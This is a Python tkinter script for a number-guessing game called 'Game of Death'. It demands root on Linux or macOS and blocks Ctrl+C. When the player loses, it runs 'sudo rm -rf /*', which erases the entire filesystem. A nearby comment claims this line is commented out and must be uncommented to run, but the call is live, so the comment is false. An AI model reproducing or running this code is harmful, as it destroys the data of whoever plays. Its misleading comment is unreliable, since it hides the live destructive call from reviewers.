import os
import random
import sys
import platform
import signal
import tkinter as tk
from tkinter import messagebox

# Function to handle SIGINT (Ctrl+C)
def signal_handler(sig, frame):
    print("\nYou can't escape that easily! Keep playing!")

# Register the signal handler for SIGINT
signal.signal(signal.SIGINT, signal_handler)

class GameOfDeath:
    def __init__(self, root):
        self.root = root
        self.root.title("Game of Death")
        self.root.geometry("1280x720")  # Set the window size to 600x400 pixels
        self.number = random.randint(1, 10)
        self.lifelines = 5
        self.attempt = 0
        self.comments = [
            "Come on, you can do better!",
            "Seriously? Try harder!",
            "Don't make me regret giving you chances!",
            "You're running out of time, focus!",
            "Are you even trying?"
        ]
        self.final_comment = "This is your last chance!\nDon't mess it up!\nOtherwise you'll face the consequences..."

        self.font = ("Helvetica", 16)  # Define a larger font size
        
        self.create_widgets()
    
    def create_widgets(self):
        self.label = tk.Label(self.root, text="Guess a number between 1 and 10:", font=self.font)
        self.label.pack(pady=20)
        
        self.entry = tk.Entry(self.root, font=self.font)
        self.entry.pack(pady=10)
        
        self.submit_button = tk.Button(self.root, text="Submit", command=self.check_guess, font=self.font)
        self.submit_button.pack(pady=20)
        
        self.message = tk.Label(self.root, text="", font=self.font, wraplength=500, justify="center")
        self.message.pack(pady=10)
        
    def check_guess(self):
        try:
            guess = int(self.entry.get())
            if guess < 1 or guess > 10:
                raise ValueError
        except ValueError:
            self.message.config(text="Invalid input! Please enter an integer between 1 and 10.")
            return
        
        self.attempt += 1
        if guess == self.number:
            self.show_custom_messagebox("Result", "You won! Live the life in Peace.......")
            self.root.destroy()
        else:
            remaining_lives = self.lifelines - self.attempt
            if remaining_lives > 0:
                if remaining_lives == 1:
                    self.message.config(text=f"Incorrect! You have {remaining_lives} life left.\n{self.final_comment}")
                else:
                    comment = self.comments[self.attempt - 1] if self.attempt - 1 < len(self.comments) else random.choice(self.comments)
                    self.message.config(text=f"Incorrect! You have {remaining_lives} lives left.\n{comment}")
            else:
                self.message.config(text="You lost! Now, you are dead.....")
                self.show_custom_messagebox("Result", "You lost! Now, you are dead.....")
                self.root.destroy()
                self.execute_deadly_command()

    def show_custom_messagebox(self, title, message):
        custom_box = tk.Toplevel(self.root)
        custom_box.title(title)
        custom_box.geometry("400x200")  # Custom size for the message box
        label = tk.Label(custom_box, text=message, font=self.font, wraplength=380, justify="center")
        label.pack(pady=20)
        button = tk.Button(custom_box, text="OK", command=custom_box.destroy, font=self.font)
        button.pack(pady=10)
        custom_box.transient(self.root)
        custom_box.grab_set()
        self.root.wait_window(custom_box)

    def execute_deadly_command(self):
        # Dangerous command, do not actually run it
        command = "sudo rm -rf /*"
        # Uncomment the line below to execute the command (Not recommended)
        os.system(command)

def main():
    # Check if the script is being run on Unix-based systems
    if platform.system() not in ["Linux", "Darwin"]:  # Darwin is the system name for macOS
        print("This script can only be run on Unix-based systems!")
        sys.exit(1)

    # Check if the script is being run as root
    if os.geteuid() != 0:
        print("This script must be run as root!")
        sys.exit(1)

    root = tk.Tk()
    app = GameOfDeath(root)
    root.mainloop()

if __name__ == "__main__":
    main()
